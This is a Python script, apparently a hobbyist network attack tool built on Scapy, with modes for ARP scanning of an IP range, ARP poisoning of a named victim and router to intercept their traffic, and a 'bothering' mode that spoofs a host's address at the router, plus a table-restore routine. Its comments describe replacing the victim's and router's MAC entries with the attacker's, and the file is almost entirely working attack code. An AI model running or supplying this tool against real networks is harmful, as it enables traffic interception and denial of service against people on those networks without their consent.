from scapy.all import srp, Ether, ARP, send	# ARP attack module
import argparse 	# Take 'option' and 'value' 
import ctypes		# Check if root
import sys
from time import sleep
from threading import Thread
from datetime import datetime

thread_check = 0
interface = 'Your Network Interface' # Intel(R) Dual Band Wireless-AC 7265

def prettyCommand(num):
	if num == 1:
		string = ['┽','╀','┾','╁']
		i = ''
		while True:
			for i in string:
			    sys.stdout.write('[*] Please wait..%s\r' % i)
			    #sys.stdout.flush()
			    sleep(0.1)
			if thread_check == 1:
				break
		print("[*] Please wait..%s" % i)
	if num == 2:
		print("")
		string = ['┽','╀','┾','╁']
		i = ''
		while True:
			for i in string:
			    sys.stdout.write('[*] Finding MAC address..%s\r' % i)
			    #sys.stdout.flush()
			    sleep(0.1)
			if thread_check == 2:
				break
		print('[*] Finding MAC address..%s' % i)
	if num == 3:
		print("\n[CTRL-C to stop]")
		string = ['[*] Start attack ▷▷▷▷▷','[*] sTart attack ▶▷▷▷▷',\
					'[*] stArt attack ▶▶▷▷▷','[*] staRt attack ▶▶▶▷▷',\
					'[*] starT attack ▶▶▶▶▷','[*] start attack ▶▶▶▶▶',\
					'[*] start Attack ▷▷▷▷▷','[*] start aTtack ▶▷▷▷▷',\
					'[*] start atTack ▶▶▷▷▷','[*] start attAck ▶▶▶▷▷',\
					'[*] start attaCk ▶▶▶▶▷','[*] start attacK ▶▶▶▶▶']
		i = ''
		while True:
			for i in string:
			    sys.stdout.write('%s\r' % i)
			    #sys.stdout.flush()
			    sleep(0.1)
			if thread_check == 3:
				break
		print('[!] Stop attack')
	if num == 4:
		print("")
		string = ['┽','╀','┾','╁']
		i = ''
		while True:
			for i in string:
			    sys.stdout.write('[*] Please wait.. Scanning..%s\r' % i)
			    #sys.stdout.flush()
			    sleep(0.1)
			if thread_check == 4:
				break
		print('[*] Please wait.. Scanning..%s' % i)

# Check if run as root
def is_root():
	global thread_check
	if ctypes.windll.shell32.IsUserAnAdmin() != True:	# [!] windows => check if run as root
		sleep(0.4)
		thread_check = 1
		sleep(0.1)
		sys.exit("[!] Please run as root")
	else:
		sleep(0.4)
		thread_check = 1
		sleep(0.1)
		print("[*] Checked run as root")

# Input the victimIP and RouterIP
def parse_args():
	parser = argparse.ArgumentParser(description = 'This program is ARP tool...')
	parser.add_argument('-s', help = 'Scanning mode. Example : -s [IP range]')
	parser.add_argument('-a', nargs = '+', help = 'ARP poisoning mode. Example : -a [victimIP] [routerIP]')
	parser.add_argument('-b', nargs = '+',help='Bothering mode. Example -b [bothered IP] [routerIP]')
	return parser.parse_args()

# Broadcast scan
def broadcast(ips):
	global thread_check
	prettyCom4 = Thread(target = prettyCommand, args=(4,))
	prettyCom4.start()
	try:
		start_time = datetime.now()	
		ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ips), timeout = 2, iface =interface, inter = 0.1, verbose=0)

		thread_check = 4
		sleep(0.4)

		print("IP - MAC\n")
		for send, receive in ans:
			print(receive.sprintf(r"%ARP.psrc% - %Ether.src%"))
		stop_time = datetime.now()
		total_time = stop_time - start_time
		print("\n[*] Scanning Complete!")
		print("[*] Scan Duration : %s" %(total_time))
	except KeyboardInterrupt:	# If user want to quit.. ( keyboardInterrupt = Ctr+c )
		thread_check = 4
		sleep(0.4)
		print("\n[*] User Requested Shutdown")
		print("[*] Quitting...")
		sys.exit(1)

# Find MAC address
def originalMAC(IPaddr):
	# src --> maybe.. send packet and return output
	# 'op = 1' --> ARP request mode
	# 'timeout = 2' --> If 'ARP reply' is none for 2 secs, stop sending 'ARP request'.
	# 'verbose = 0' --> srp's report is hidden
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op = 1, pdst = IPaddr), timeout = 2, iface =interface, verbose = 0)
	for send, receive in ans:
		MACaddr = receive[Ether].src
		return MACaddr

# ARP reply attack
def poison(vIP,vMAC,rIP,rMAC):
	global thread_check
	# send --> maybe.. just send packet, no return output
	# 'op = 2' --> ARP reply mode
	prettyCom3 = Thread(target = prettyCommand, args=(3,))
	prettyCom3.start()
	try:
		while True:
			send(ARP(op = 1, psrc = vIP, pdst = rIP, hwdst = rMAC), iface =interface, verbose = 0) # Make ARP reply and send to router, so in router's ARP table, victim mac address is changed hacker's mac address.
			send(ARP(op = 1, psrc = rIP, pdst = vIP, hwdst = vMAC), iface =interface, verbose = 0) # Make ARP reply and send to victim, so in victim's ARP table, router mac address is changed hacker's mac address.
			sleep(0.5)
	except KeyboardInterrupt:
		thread_check = 3
		sleep(1)
		print("\n[!] Restoring network..")
		prettyCom1 = Thread(target = prettyCommand, args=(1,))
		prettyCom1.start()
		sleep(1)
		restoreTable(vIP,vMAC,rIP,rMAC)

def bother(bIP,bMAC,rIP,rMAC):
	global thread_check
	# send --> maybe.. just send packet, no return output
	# 'op = 2' --> ARP reply mode
	prettyCom3 = Thread(target = prettyCommand, args=(3,))
	prettyCom3.start()
	try:
		while True:
			send(ARP(op = 2, pdst = rIP, psrc = bIP, hwdst = rMAC), iface =interface, verbose = 0) # Make ARP reply and send to router, so in router's ARP table, victim mac address is changed hacker's mac address.
			sleep(0.5)
	except KeyboardInterrupt:
		thread_check = 3
		sleep(1)
		print("\n[!] Restoring network..")
		prettyCom1 = Thread(target = prettyCommand, args=(1,))
		prettyCom1.start()
		sleep(1)
		restoreTable(bIP,bMAC,rIP,rMAC)

def restoreTable(vIP,vMAC,rIP,rMAC):
	global thread_check
	send(ARP(op = 2, pdst = rIP, psrc = vIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = vMAC),iface =interface, count = 3, verbose = 0)
	send(ARP(op = 2, pdst = vIP, psrc = rIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = rMAC),iface =interface, count = 3, verbose = 0)
	thread_check = 1
	sleep(0.4)
	print("[!] Quitting..")

def main(args):
	global thread_check

	ScanIP = args.s
	if ScanIP:
		broadcast(ScanIP)
		sys.exit(1)
	if args.a:	# Check args.a's index
		try:
			prettyCom2 = Thread(target = prettyCommand, args=(2,))
			prettyCom2.start()
			victimIP = args.a[0]
			routerIP = args.a[1]

			routerMAC = originalMAC(routerIP)
			victimMAC = originalMAC(victimIP)
			thread_check = 2
			sleep(0.4)
			print("[*] victim  >>  IP :",victimIP,"  MAC :",victimMAC)
			print("[*] router  >>  IP :",routerIP,"  MAC :",routerMAC)

			if not routerMAC or not victimMAC:
				sys.exit("\n[!] Cannot found entered IP's MAC address. Please check IP.")
			sleep(1)
			poison(victimIP,victimMAC,routerIP,routerMAC)
		except IndexError:
			sys.exit("\n[!] Please enter the victim,router IP or -h")
	if args.b:	# Check args.b's index
		try:
			prettyCom2 = Thread(target = prettyCommand, args=(2,))
			prettyCom2.start()
			botherIP = args.b[0]
			routerIP = args.b[1]

			routerMAC = originalMAC(routerIP)
			botherMAC = originalMAC(botherIP)
			thread_check = 2
			sleep(0.4)
			print("[*] bother  >>  IP :",botherIP,"  MAC :",botherMAC)
			print("[*] router  >>  IP :",routerIP,"  MAC :",routerMAC)

			if not routerMAC or not botherMAC:
				sys.exit("\n[!] Cannot found entered IP's MAC address. Please check IP.")
			sleep(1)
			bother(botherIP,botherMAC,routerIP,routerMAC)
		except IndexError:
			sys.exit("\n[!] Please enter the bother,router IP or -h")

prettyCom1 = Thread(target = prettyCommand, args=(1,))
prettyCom1.start()
is_root()
sleep(1)
main(parse_args()) 
